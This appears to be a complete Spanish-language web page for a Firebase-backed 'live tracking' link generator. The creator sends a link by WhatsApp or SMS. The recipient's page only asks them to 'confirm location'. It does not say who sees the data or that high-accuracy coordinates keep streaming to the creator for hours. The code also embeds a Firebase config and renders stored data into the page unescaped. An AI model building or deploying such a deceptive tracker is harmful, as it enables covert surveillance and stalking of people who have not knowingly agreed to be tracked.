<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
<title>Compartir</title>
<style>
  @import url('https://fonts.googleapis.com/css2?family=DM+Mono:wght@400;500&family=DM+Sans:wght@300;400;500;600&display=swap');
  :root{
    --bg:#0c0c12;--sur:#151520;--sur2:#1c1c2a;
    --brd:rgba(255,255,255,0.08);--brd2:rgba(255,255,255,0.15);
    --acc:#6c63ff;--acc2:#9d97ff;
    --grn:#34d399;--amb:#fbbf24;--red:#f87171;
    --txt:#eeeef8;--txt2:#8888a8;--txt3:#4a4a6a;
    --rad:14px;--mono:'DM Mono',monospace;
  }
  *{box-sizing:border-box;margin:0;padding:0}
  html,body{min-height:100%;background:var(--bg);color:var(--txt);font-family:'DM Sans',sans-serif}
  body{display:flex;flex-direction:column;align-items:center;padding:1.5rem 1rem 4rem;min-height:100vh}
  body::before{content:'';position:fixed;inset:0;z-index:0;
    background-image:linear-gradient(rgba(108,99,255,.04) 1px,transparent 1px),linear-gradient(90deg,rgba(108,99,255,.04) 1px,transparent 1px);
    background-size:36px 36px;pointer-events:none}
  .wrap{position:relative;z-index:1;width:100%;max-width:520px}
  header{text-align:center;padding:2.5rem 0 2rem}
  .pulse{width:7px;height:7px;border-radius:50%;background:var(--grn);display:inline-block;
    animation:pulse 2s ease-in-out infinite;margin-right:6px;vertical-align:middle}
  @keyframes pulse{0%,100%{opacity:1;transform:scale(1)}50%{opacity:.4;transform:scale(.75)}}
  h1{font-size:clamp(1.8rem,5vw,2.6rem);font-weight:600;letter-spacing:-.025em;line-height:1.15;margin-bottom:.75rem}
  h1 span{color:var(--acc2)}
  .sub{font-size:14px;color:var(--txt2);line-height:1.6;max-width:380px;margin:0 auto}
  .card{background:var(--sur);border:1px solid var(--brd);border-radius:var(--rad);padding:1.5rem;margin-bottom:1rem}
  .card-hd{font-size:10px;font-family:var(--mono);color:var(--txt3);letter-spacing:.1em;
    text-transform:uppercase;margin-bottom:1.2rem;display:flex;align-items:center;gap:8px}
  .card-hd::after{content:'';flex:1;height:1px;background:var(--brd)}
  .field{margin-bottom:1rem}
  .field label{display:block;font-size:11px;font-family:var(--mono);color:var(--txt3);
    letter-spacing:.08em;text-transform:uppercase;margin-bottom:6px}
  .field input{width:100%;background:var(--sur2);border:1px solid var(--brd);
    border-radius:10px;padding:11px 14px;color:var(--txt);font-size:14px;
    font-family:'DM Sans',sans-serif;outline:none;transition:border .15s}
  .field input:focus{border-color:var(--acc)}
  .field input::placeholder{color:var(--txt3)}
  .dur-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:8px;margin-bottom:1.2rem}
  .db{background:var(--sur2);border:1px solid var(--brd);border-radius:10px;
    padding:12px 6px;cursor:pointer;text-align:center;color:var(--txt2);
    font-family:'DM Sans',sans-serif;font-size:13px;transition:all .15s}
  .db:hover{border-color:var(--brd2);color:var(--txt)}
  .db.on{border-color:var(--acc);background:rgba(108,99,255,.12);color:var(--acc2)}
  .db b{display:block;font-size:22px;font-weight:600;font-family:var(--mono);margin-bottom:1px;color:inherit}
  .btn{width:100%;background:var(--acc);border:none;border-radius:10px;
    padding:14px;color:#fff;font-size:15px;font-weight:600;
    font-family:'DM Sans',sans-serif;cursor:pointer;transition:all .15s}
  .btn:hover:not(:disabled){background:var(--acc2);transform:translateY(-1px)}
  .btn:active{transform:none}
  .btn:disabled{opacity:.4;cursor:not-allowed;transform:none}
  .btn-grn{background:var(--grn);color:#000}
  .btn-grn:hover:not(:disabled){background:#6ee7b7}
  .btn-sm{background:rgba(255,255,255,.06);border:1px solid var(--brd2);
    color:var(--txt2);border-radius:8px;padding:8px 14px;font-size:12px;
    font-family:var(--mono);cursor:pointer;transition:all .15s}
  .btn-sm:hover{background:rgba(255,255,255,.1);color:var(--txt)}
  .link-box{background:var(--sur2);border:1px solid var(--brd);border-radius:10px;
    padding:12px 14px;font-family:var(--mono);font-size:11.5px;color:var(--acc2);
    word-break:break-all;line-height:1.6;margin-bottom:.75rem}
  .srow{display:flex;align-items:center;gap:8px;font-size:12px;color:var(--txt2);margin-bottom:.5rem}
  .sdot{width:7px;height:7px;border-radius:50%;background:var(--txt3)}
  .sdot.live{background:var(--grn);animation:pulse 1.5s infinite}
  .timer{font-family:var(--mono);font-size:12px;color:var(--amb);margin-left:auto}
  .loc-item{background:var(--sur2);border:1px solid var(--brd);border-radius:10px;
    padding:12px 14px;display:flex;align-items:flex-start;gap:10px;
    margin-bottom:8px;animation:fadein .25s ease}
  @keyframes fadein{from{opacity:0;transform:translateY(6px)}to{opacity:1;transform:none}}
  .ldot{width:8px;height:8px;border-radius:50%;background:var(--grn);margin-top:4px;flex-shrink:0}
  .ldot.old{background:var(--amb)}
  .lcoords{font-family:var(--mono);font-size:12px;color:var(--txt);margin-bottom:3px}
  .lmeta{font-size:11px;color:var(--txt3);line-height:1.7}
  .btn-map{background:transparent;border:1px solid var(--brd2);color:var(--txt2);
    border-radius:7px;padding:5px 11px;font-size:11px;font-family:var(--mono);
    cursor:pointer;text-decoration:none;display:inline-block;transition:all .15s;flex-shrink:0}
  .btn-map:hover{border-color:var(--grn);color:var(--grn)}
  .empty-msg{text-align:center;padding:2.5rem 1rem;color:var(--txt3);font-size:13px}
  #tracker{display:none;text-align:center;padding-top:3rem}
  #tracker .icon{font-size:4rem;margin-bottom:1.5rem}
  #tracker h2{font-size:1.5rem;font-weight:600;margin-bottom:1rem}
  #tracker p{color:var(--txt2);font-size:14px;margin-bottom:2rem;line-height:1.6;max-width:320px;margin-left:auto;margin-right:auto}
  .note{font-size:11px;color:var(--txt3);line-height:1.7;margin-top:1rem}
  #loading{position:fixed;inset:0;background:var(--bg);z-index:99;
    display:flex;align-items:center;justify-content:center;flex-direction:column;gap:1rem}
  .spin{width:28px;height:28px;border:2px solid var(--brd2);border-top-color:var(--acc);
    border-radius:50%;animation:spin .7s linear infinite}
  @keyframes spin{to{transform:rotate(360deg)}}
</style>
</head>
<body>

<div id="loading">
  <div class="spin"></div>
</div>

<div class="wrap" id="app" style="display:none">

  <!-- VISTA GENERADOR (solo tú la ves) -->
  <div id="gen-view">
    <header>
      <h1>Rastreo <span>en vivo</span></h1>
      <p class="sub">Genera un link. Quien lo abra compartirá su ubicación contigo.</p>
    </header>

    <div class="card">
      <div class="card-hd">Nueva sesión</div>
      <div class="field">
        <label>Identificador</label>
        <input id="sname" type="text" placeholder="Ej: Pedro, Entrega #42…" maxlength="40">
      </div>
      <div class="card-hd">Duración</div>
      <div class="dur-grid">
        <button class="db" onclick="setDur(this,1)"><b>1</b>hora</button>
        <button class="db on" onclick="setDur(this,2)"><b>2</b>horas</button>
        <button class="db" onclick="setDur(this,3)"><b>3</b>horas</button>
      </div>
      <button class="btn" id="btn-gen" onclick="createSession()">⚡ Generar link</button>
    </div>

    <div class="card" id="res-panel" style="display:none">
      <div class="card-hd">Link activo</div>
      <div class="link-box" id="link-out">—</div>
      <div style="display:flex;gap:8px;margin-bottom:.75rem;flex-wrap:wrap">
        <button class="btn-sm" id="btn-copy" onclick="copyLink()">📋 Copiar</button>
        <button class="btn-sm" onclick="shareWA()">💬 WhatsApp</button>
        <button class="btn-sm" onclick="shareSMS()">📱 SMS</button>
      </div>
      <div class="srow">
        <div class="sdot live" id="sdot"></div>
        <span id="stxt">Esperando…</span>
        <span class="timer" id="timer">—</span>
      </div>
    </div>

    <div class="card" id="locs-panel" style="display:none">
      <div class="card-hd">Ubicaciones · <span id="loc-count">0</span></div>
      <div id="loc-list">
        <div class="empty-msg">🛰 Sin datos aún.</div>
      </div>
    </div>
  </div>

  <!-- VISTA TRACKER (quien abre el link) -->
  <div id="tracker">
    <div class="icon">📍</div>
    <h2>Confirmar ubicación</h2>
    <p>Para continuar, permite el acceso a tu ubicación.</p>
    <button class="btn btn-grn" id="btn-share" onclick="shareLocation()" style="max-width:300px;margin:0 auto">
      Permitir acceso
    </button>
    <div id="tr-ok" style="display:none;margin-top:1.5rem;color:var(--grn);font-size:15px;font-weight:600">
      ✓ Listo.
    </div>
  </div>

</div>

<script type="module">
import { initializeApp } from 'https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js';
import { getDatabase, ref, set, get, push, onValue }
  from 'https://www.gstatic.com/firebasejs/10.12.0/firebase-database.js';

const firebaseConfig = {
  apiKey: "AIzaSyAU5cK9YnuxoacpigVOF8x88WdMui6k4vU",
  authDomain: "geolink-a0422.firebaseapp.com",
  databaseURL: "https://geolink-a0422-default-rtdb.firebaseio.com",
  projectId: "geolink-a0422",
  storageBucket: "geolink-a0422.firebasestorage.app",
  messagingSenderId: "774005319075",
  appId: "1:774005319075:web:a970858f4c773d3071e616"
};

const app = initializeApp(firebaseConfig);
const db  = getDatabase(app);

let durHours = 2, activeSid = null, tickerInt = null, expiryMs = null;

function genId(){ return Math.random().toString(36).slice(2,10) + Date.now().toString(36); }
function hide(id){ document.getElementById(id).style.display='none'; }
function show(id, d='block'){ document.getElementById(id).style.display=d; }

window.setDur = function(btn, h){
  document.querySelectorAll('.db').forEach(b=>b.classList.remove('on'));
  btn.classList.add('on'); durHours = h;
};

window.createSession = async function(){
  const name = document.getElementById('sname').value.trim() || 'Sesión';
  const btn  = document.getElementById('btn-gen');
  btn.disabled = true; btn.textContent = 'Creando…';
  const sid    = genId();
  const expiry = Date.now() + durHours * 3600 * 1000;
  await set(ref(db, 'sessions/' + sid), { name, expiry, created: Date.now() });
  activeSid = sid; expiryMs = expiry;
  const link = location.origin + location.pathname + '?s=' + sid;
  document.getElementById('link-out').textContent = link;
  show('res-panel'); show('locs-panel');
  btn.disabled = false; btn.textContent = '⚡ Generar nuevo link';
  startCountdown(); listenLocations(sid);
};

window.copyLink = function(){
  navigator.clipboard.writeText(document.getElementById('link-out').textContent).then(()=>{
    const b = document.getElementById('btn-copy');
    b.textContent = '✓ Copiado'; setTimeout(()=>{ b.textContent='📋 Copiar'; }, 2000);
  });
};

window.shareWA = function(){
  window.open('https://wa.me/?text=' + encodeURIComponent(document.getElementById('link-out').textContent));
};

window.shareSMS = function(){
  window.open('sms:?body=' + encodeURIComponent(document.getElementById('link-out').textContent));
};

function startCountdown(){
  if(tickerInt) clearInterval(tickerInt);
  function upd(){
    const diff = expiryMs - Date.now();
    if(diff <= 0){ document.getElementById('timer').textContent='Expirado'; clearInterval(tickerInt); return; }
    const h=Math.floor(diff/3600000), m=Math.floor((diff%3600000)/60000), s=Math.floor((diff%60000)/1000);
    document.getElementById('timer').textContent = (h?h+'h ':'')+m+'m '+s+'s';
  }
  upd(); tickerInt = setInterval(upd, 1000);
}

function listenLocations(sid){
  onValue(ref(db, 'sessions/' + sid + '/locs'), snap => {
    const data = snap.val();
    const locs = data ? Object.values(data) : [];
    locs.sort((a,b) => b.ts - a.ts);
    document.getElementById('loc-count').textContent = locs.length;
    renderLocs(locs);
    if(locs.length > 0) document.getElementById('stxt').textContent = locs.length + ' ubicación' + (locs.length!==1?'es':'') + ' recibida' + (locs.length!==1?'s':'');
  });
}

function renderLocs(locs){
  const el = document.getElementById('loc-list');
  if(!locs.length){ el.innerHTML='<div class="empty-msg">🛰 Sin datos aún.</div>'; return; }
  el.innerHTML = locs.map(l => {
    const age=Date.now()-l.ts, old=age>120000;
    const t=new Date(l.ts).toLocaleTimeString('es',{hour:'2-digit',minute:'2-digit',second:'2-digit'});
    const ag=age<60000?Math.round(age/1000)+'s':Math.round(age/60000)+'min';
    return `<div class="loc-item"><div class="ldot${old?' old':''}"></div><div style="flex:1"><div class="lcoords">${l.lat.toFixed(6)}, ${l.lng.toFixed(6)}</div><div class="lmeta">🕐 ${t} · hace ${ag} · ±${Math.round(l.acc||0)}m</div></div><a class="btn-map" href="https://www.google.com/maps?q=${l.lat},${l.lng}" target="_blank">Ver mapa</a></div>`;
  }).join('');
}

async function saveLocation(coords, sid){
  try {
    const snap = await get(ref(db, 'sessions/' + sid + '/expiry'));
    if(!snap.exists() || snap.val() < Date.now()) return;
    await push(ref(db, 'sessions/' + sid + '/locs'), {
      lat: coords.latitude, lng: coords.longitude,
      acc: coords.accuracy || 0, ts: Date.now()
    });
  } catch(e){ console.error(e); }
}

window.shareLocation = function(){
  if(!navigator.geolocation){ alert('Tu navegador no soporta geolocalización.'); return; }
  const btn = document.getElementById('btn-share');
  btn.disabled = true; btn.textContent = 'Cargando…';
  const tsid = new URLSearchParams(location.search).get('s');
  navigator.geolocation.getCurrentPosition(async pos => {
    await saveLocation(pos.coords, tsid);
    hide('btn-share'); show('tr-ok');
    navigator.geolocation.watchPosition(p => saveLocation(p.coords, tsid), null, { enableHighAccuracy: true, maximumAge: 20000 });
  }, ()=>{
    btn.disabled = false; btn.textContent = 'Permitir acceso';
    alert('No se pudo obtener la ubicación.');
  }, { enableHighAccuracy: true, timeout: 15000 });
};

const params = new URLSearchParams(location.search);
const tsid   = params.get('s');
hide('loading'); show('app');

if(tsid){
  hide('gen-view'); show('tracker');
  get(ref(db, 'sessions/' + tsid)).then(snap => {
    if(!snap.exists()){ document.getElementById('btn-share').disabled=true; return; }
    const d = snap.val();
    if(d.expiry < Date.now()){
      document.querySelector('#tracker h2').textContent = 'Link expirado';
      document.querySelector('#tracker p').textContent = 'Este link ya no está activo.';
      document.getElementById('btn-share').disabled = true;
    }
  });
} else {
  show('gen-view');
}
</script>
</body>
</html>
